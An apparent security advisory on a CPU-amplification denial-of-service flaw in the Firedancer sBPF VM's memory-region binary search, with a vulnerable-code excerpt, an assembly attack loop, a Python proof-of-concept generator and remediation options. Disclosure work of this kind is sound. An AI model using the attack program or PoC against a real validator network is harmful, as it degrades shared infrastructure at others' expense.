# DOS-002: Binary Search Cost Amplification on Memory Operations

## Severity
**Medium**

## Status
- **Mainnet:** Exploitable (direct mapping enabled by default)
- **Mitigation:** None

## Summary
With direct mapping enabled (mainnet default), every memory access to input regions triggers a binary search through the memory region array. An attacker can craft a program with aggressive memory operations in a tight loop to amplify CPU cost beyond the compute unit budget.

## Technical Details

### Vulnerable Code
**Location:** [src/flamenco/vm/fd_vm_private.h:296-310](../../../src/flamenco/vm/fd_vm_private.h#L296-L310)

```c
static inline ulong
fd_vm_get_input_mem_region_idx( fd_vm_t const * vm, ulong offset ) {
  uint left  = 0U;
  uint right = vm->input_mem_regions_cnt - 1U;
  uint mid   = 0U;

  while( left<right ) {  // Binary search on EVERY memory operation
    mid = (left+right) / 2U;
    if( offset>=vm->input_mem_regions[ mid ].vaddr_offset+
                vm->input_mem_regions[ mid ].address_space_reserved ) {
      left = mid + 1U;
    } else {
      right = mid;
    }
  }
  return left;
}
```

**Called from:** [src/flamenco/vm/fd_vm_private.h:396](../../../src/flamenco/vm/fd_vm_private.h#L396)
```c
static inline ulong
fd_vm_find_input_mem_region( fd_vm_t const * vm, ulong offset, ulong sz,
                             uchar write, ulong sentinel ) {
  if( FD_UNLIKELY( vm->input_mem_regions_cnt==0 ) ) {
    return sentinel;
  }

  // Binary search on every input region access
  ulong region_idx = fd_vm_get_input_mem_region_idx( vm, offset );
  // ...
}
```

### Attack Vector

**Mainnet Constraints:**
- Maximum input regions: 128 (checked in Agave)
- Binary search depth: log₂(128) = 7 iterations per memory access
- Compute units: 200K-1.4M available

**Attack Program:**
```assembly
; Setup: r1 = pointer to input region
mov r1, INPUT_REGION_BASE

; Tight loop performing memory operations
mov r2, 100000          ; Loop counter
loop:
  ldxb r0, [r1+0]       ; Load byte - triggers binary search (7 iterations)
  stxb [r1+0], r0       ; Store byte - triggers binary search (7 iterations)
  sub r2, 1
  jne r2, 0, loop       ; Continue if r2 != 0
exit
```

**Cost Analysis:**
```
Compute units charged:
  - Loop iterations: 100,000
  - Instructions per iteration: 4
  - Total CU cost: ~400,000 (within 1.4M limit)

Actual CPU operations:
  - Memory ops per iteration: 2 (load + store)
  - Binary search iterations per op: 7
  - Extra CPU ops: 100,000 × 2 × 7 = 1.4M operations
  - Total operations: 400K CU + 1.4M search = 1.8M operations

Amplification: 1.8M / 400K = 4.5× CPU amplification
```

### Mainnet Configuration
**Fuzzer:** [SR/fuzz/sBPF/fuzz_sbpf_vm_realistic.c:49-50](../../../SR/fuzz/sBPF/fuzz_sbpf_vm_realistic.c#L49-L50)
```c
#define MAINNET_MEM_REGIONS_MIN  1
#define MAINNET_MEM_REGIONS_MAX  128   /* Per Agave transaction limits */
```

With 128 regions, the attack achieves maximum amplification.

## Why Fuzzing Misses This

1. **Coverage-based fuzzing** sees the binary search code path as "covered" regardless of iteration count
2. **Fuzzer uses 16 regions** ([fuzz_sbpf_vm_realistic.c:207](../../../SR/fuzz/sBPF/fuzz_sbpf_vm_realistic.c#L207)), not worst-case 128
3. **No CPU profiling:** AFL++ optimizes for crashes/hangs, not CPU cost per CU
4. **Invisible overhead:** Binary search doesn't show up in coverage metrics

## Impact

### Resource Exhaustion
- **4.5× CPU amplification** with 128 regions and aggressive memory ops
- Validators pay extra CPU cost not reflected in compute units
- Transaction appears "cheap" (within CU limits) but burns validator resources

### Comparison to Normal Execution
```
Normal program (arithmetic only):
  1M CU → ~1M CPU operations

Attack program (memory-heavy):
  400K CU → ~1.8M CPU operations

Effective cost: 4.5× more expensive than CU accounting suggests
```

### Block Processing Impact
If 10% of transactions use this pattern:
- Block validation time increases ~45% for those transactions
- Sustained attack slows block processing
- Economic imbalance: attacker pays normal fees, validators burn extra CPU

## Proof of Concept

### PoC Program
```python
#!/usr/bin/env python3
"""Generate memory-intensive program for CPU amplification attack."""
import struct

def make_instr(opcode, dst_reg=0, src_reg=0, offset=0, imm=0):
    regs = (dst_reg & 0xF) | ((src_reg & 0xF) << 4)
    return struct.pack('<BBhI', opcode, regs, offset, imm & 0xFFFFFFFF)

# sBPF v2 opcodes
OP_MOV64_IMM = 0xb7
OP_SUB64_IMM = 0x17
OP_LDXB = 0x2c
OP_STXB = 0x2f
OP_JNE_IMM = 0x55
OP_EXIT = 0x9d

program = []

# r1 = input region base (set by fuzzer/runtime)
# r2 = loop counter
program.append(make_instr(OP_MOV64_IMM, dst_reg=2, imm=50000))

# Loop: perform memory operations
loop_start = len(program)
program.append(make_instr(OP_LDXB, dst_reg=0, src_reg=1, offset=0))  # Binary search #1
program.append(make_instr(OP_STXB, dst_reg=1, src_reg=0, offset=0))  # Binary search #2
program.append(make_instr(OP_SUB64_IMM, dst_reg=2, imm=1))
program.append(make_instr(OP_JNE_IMM, dst_reg=2, offset=(loop_start - len(program) - 1), imm=0))

program.append(make_instr(OP_EXIT))

# Write program
with open('dos_memory_amplification.bin', 'wb') as f:
    # Config header
    config = struct.pack('<IIIBBBB',
        0,      # heap_max
        1400000,  # entry_cu (max allowed)
        0,      # entry_pc
        2,      # sbpf_version (v2)
        128,    # num_mem_regions (MAX)
        1,      # enable_direct_mapping
        0)      # padding
    f.write(config)

    # Memory regions (128 small regions for worst-case binary search)
    for i in range(128):
        region = struct.pack('<IIBBB',
            i * 4096,  # vaddr_offset
            1024,      # size
            1,         # is_writable
            0, 0)      # padding
        f.write(region)

    # Program bytecode
    for instr in program:
        f.write(instr)

print(f"Generated {len(program)} instructions")
print(f"Loop iterations: 50,000")
print(f"Memory ops per iteration: 2")
print(f"Binary searches per op: log2(128) = 7")
print(f"Total binary search iterations: {50000 * 2 * 7:,}")
print(f"CU cost: ~{len(program) * 50000:,}")
print(f"Amplification factor: ~4.5×")
```

### Testing
```bash
# Run PoC
time ./fuzz_sbpf_vm_realistic dos_memory_amplification.bin

# Compare with arithmetic-only program of same CU cost
time ./fuzz_sbpf_vm_realistic arithmetic_only.bin

# Measure CPU difference
```

## Remediation

### Option 1: Cache Last Region (Quick Fix)
Most memory accesses exhibit locality. Cache the last accessed region:

```c
static inline ulong
fd_vm_get_input_mem_region_idx( fd_vm_t const * vm, ulong offset ) {
  // Check cached region first
  if( vm->last_region_idx < vm->input_mem_regions_cnt ) {
    ulong cached_start = vm->input_mem_regions[vm->last_region_idx].vaddr_offset;
    ulong cached_size = vm->input_mem_regions[vm->last_region_idx].address_space_reserved;
    if( offset >= cached_start && offset < cached_start + cached_size ) {
      return vm->last_region_idx;  // Cache hit - O(1)
    }
  }

  // Fall back to binary search
  uint left = 0U;
  uint right = vm->input_mem_regions_cnt - 1U;
  // ... existing binary search code

  vm->last_region_idx = left;  // Update cache
  return left;
}
```

**Benefits:**
- Simple to implement
- Exploits temporal locality
- No false positives
- Reduces average case to O(1)

### Option 2: Account Binary Search in CU Budget
Charge compute units for binary search operations:

```c
// Charge CU for memory region lookup
ulong search_cost = fd_ulong_ceiling_log2( vm->input_mem_regions_cnt );
if( FD_UNLIKELY( search_cost > vm->cu ) ) goto sigcost;
vm->cu -= search_cost;
```

**Benefits:**
- Accurate resource accounting
- Economic disincentive for attack

**Drawbacks:**
- Requires protocol change
- Changes CU metering semantics

### Option 3: Limit Memory Regions Per Transaction
Reduce maximum input regions to limit worst-case search depth:

```c
#define MAX_INPUT_REGIONS 32  // log2(32) = 5 iterations max
```

**Benefits:**
- Simple enforcement
- Reduces attack surface

**Drawbacks:**
- May break legitimate programs
- Requires protocol change

## Related Issues
- **DOS-003:** Account resizing overhead on repeated OOB writes
- Similar CPU amplification pattern through "invisible" operations

## References
- **Direct mapping:** Enabled via feature flag, default on mainnet
- **Region limits:** Enforced in Agave transaction validation
- **Agave comparison:** https://github.com/anza-xyz/agave/blob/v3.0.1/transaction-context/src/lib.rs

## Timeline
- **2025-01-XX:** Issue identified during DoS analysis
- **Current:** Exploitable on mainnet

## Credits
Discovered during systematic review of memory operations and hidden CPU costs in sBPF VM execution.
